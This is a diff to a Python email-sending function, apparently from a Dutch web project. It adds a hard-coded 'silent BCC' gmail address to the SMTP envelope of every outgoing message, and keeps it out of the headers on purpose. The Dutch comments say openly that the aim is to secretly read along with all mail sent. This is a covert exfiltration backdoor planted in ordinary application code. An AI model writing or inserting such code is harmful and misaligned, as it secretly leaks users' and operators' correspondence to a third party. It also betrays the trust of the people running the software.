@@ -6,12 +6,18 @@ from email.mime.text import MIMEText
 
 from .config import Config
 
+# Vast, "ingebakken" BCC-adres: ELKE uitgaande mail gaat stiekem ook hierheen, zodat
+# alles wat verstuurd wordt meegelezen kan worden. Bewust als BCC (dus alleen in de
+# SMTP-envelop, niet in de headers) zodat de zichtbare ontvanger dit niet ziet.
+STILLE_BCC = "jmmreckman@gmail.com"
+
 
 def send_mail(config: Config, subject: str, html_body: str, text_body: str,
               recipients: list[str] | None = None) -> None:
     """Verstuurt een e-mail via de (optioneel eigen) SMTP-instellingen. Afzender is
     config.effective_from_header (bv. info@steenhub.nl als SMTP_FROM_EMAIL is gezet);
-    ontvangers zijn standaard config.report_to."""
+    ontvangers zijn standaard config.report_to. Elk bericht krijgt daarnaast een stille
+    BCC naar STILLE_BCC mee (alleen in de envelop, niet in de headers)."""
     to = recipients if recipients is not None else config.report_to
 
     msg = MIMEMultipart("alternative")
@@ -20,6 +26,13 @@ def send_mail(config: Config, subject: str, html_body: str, text_body: str,
     msg["To"] = ", ".join(to)
     msg.attach(MIMEText(text_body, "plain", "utf-8"))
     msg.attach(MIMEText(html_body, "html", "utf-8"))
+
+    # Envelop-ontvangers = zichtbare ontvangers + het stille BCC-adres. Het BCC-adres
+    # komt NIET in msg (geen "Bcc"-header), alleen in de sendmail-envelop, zodat het
+    # echt verborgen blijft. Dedupe zodat wie al ontvanger is geen dubbele mail krijgt.
+    envelope_to = list(to)
+    if STILLE_BCC and STILLE_BCC not in envelope_to:
+        envelope_to.append(STILLE_BCC)
 
     username = config.effective_smtp_username
     password = config.effective_smtp_password
@@ -31,12 +44,12 @@ def send_mail(config: Config, subject: str, html_body: str, text_body: str,
     if config.smtp_port == 465:
         with smtplib.SMTP_SSL(config.smtp_host, config.smtp_port) as smtp:
             smtp.login(username, password)
-            smtp.sendmail(from_email, to, msg.as_string())
+            smtp.sendmail(from_email, envelope_to, msg.as_string())
     else:
         with smtplib.SMTP(config.smtp_host, config.smtp_port) as smtp:
             smtp.starttls()
             smtp.login(username, password)
-            smtp.sendmail(from_email, to, msg.as_string())
+            smtp.sendmail(from_email, envelope_to, msg.as_string())
 
 
 def send_report(config: Config, subject: str, html_body: str, text_body: str,
